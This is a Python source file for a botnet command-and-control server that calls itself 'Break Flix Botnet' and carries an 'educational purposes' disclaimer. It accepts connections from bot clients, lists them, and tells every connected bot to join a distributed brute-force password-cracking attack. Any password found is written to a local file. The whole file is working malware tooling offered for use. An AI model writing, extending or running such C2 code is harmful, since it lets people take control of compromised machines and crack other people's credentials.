import socket
from _thread import *
import time
from argparse import ArgumentParser

def wait_for_password(host_connection):
    host_connection.send(str.encode('pwd_cracking'))
    host_connection.send(str.encode('["whoami"]'))
    data = host_connection.recv(2048)
    time.sleep(10)
    with open("password", "w") as file:
        file.write(data.decode('utf-8'))
    

def udpate_connected_clients(connected_hosts):
    for host_connection in connected_hosts:
        try:
            host_connection.send(str.encode('connected'))
        except socket.error:
            connected_hosts.remove(host_connection)

def botnet_menu(ServerSideSocket, connected_hosts):
    print("""
    
██████╗░██████╗░███████╗░█████╗░██╗░░██╗  ███████╗██╗░░░░░██╗██╗░░██╗
██╔══██╗██╔══██╗██╔════╝██╔══██╗██║░██╔╝  ██╔════╝██║░░░░░██║╚██╗██╔╝
██████╦╝██████╔╝█████╗░░███████║█████═╝░  █████╗░░██║░░░░░██║░╚███╔╝░   
██╔══██╗██╔══██╗██╔══╝░░██╔══██║██╔═██╗░  ██╔══╝░░██║░░░░░██║░██╔██╗░   █▀▀▄ █▀▀█ ▀▀█▀▀ █▀▀▄ █▀▀ ▀▀█▀▀
██████╦╝██║░░██║███████╗██║░░██║██║░╚██╗  ██║░░░░░███████╗██║██╔╝╚██╗   █▀▀▄ █░░█ ░░█░░ █░░█ █▀▀ ░░█░░ 
╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝  ╚═╝░░░░░╚══════╝╚═╝╚═╝░░╚═╝   ▀▀▀░ ▀▀▀▀ ░░▀░░ ▀░░▀ ▀▀▀ ░░▀░░

Created for educational purposes. We don't take responsibility for your actions.
    """)
    while True:
        print("""

▒█▀▄▀█ ▒█▀▀▀ ▒█▄░▒█ ▒█░▒█ 
▒█▒█▒█ ▒█▀▀▀ ▒█▒█▒█ ▒█░▒█ 
▒█░░▒█ ▒█▄▄▄ ▒█░░▀█ ░▀▄▄▀

1. List connected clients
2. Distributed password cracking brute force attack
3. Close
        """)

        opt = input("Choose one option:")

        print("")
        if opt == "1":
            udpate_connected_clients(connected_hosts)
            print("Total hosts connected: ", len(connected_hosts))

            for host_connection in connected_hosts:
                host, port = host_connection.getpeername()
                print(host)

        elif opt == "2":
            udpate_connected_clients(connected_hosts)
            print("Dividing dictionary between {} connected clients", len(connected_hosts))
            print("Password cracking started, if the password is found it will be saved to password file in the current directory")
            for host_connection in connected_hosts:
                start_new_thread(wait_for_password, (host_connection, ))
        elif opt == "3":
            print("Closing socket")
            ServerSideSocket.close()
            return 1
if __name__ == '__main__':
    
    parser = ArgumentParser()
    parser.add_argument("-p", "--port", default="9090", help="Port were will listen the botnet")
    parser.add_argument("-i", "--interface", default="", help="Interface IP were will listen the botnet, default 0.0.0.0")
    args = parser.parse_args()
    
    ServerSideSocket = socket.socket()
    host = args.interface
    port = int(args.port)
    ThreadCount = 0
    connected_hosts = []
    try:
        ServerSideSocket.bind((host, port))
    except socket.error as e:
        print(str(e))
    start_new_thread(botnet_menu, (ServerSideSocket, connected_hosts))
    print('Socket is listening..')
    ServerSideSocket.listen(5)

    while True:
        try:
            Client, address = ServerSideSocket.accept()
            # print('\nClient connected from ' + address[0] + ':' + str(address[1]))
            connected_hosts.append(Client)
            ThreadCount += 1
        except:
            # Socket was closed.
            print("Botnet server was closed")
            break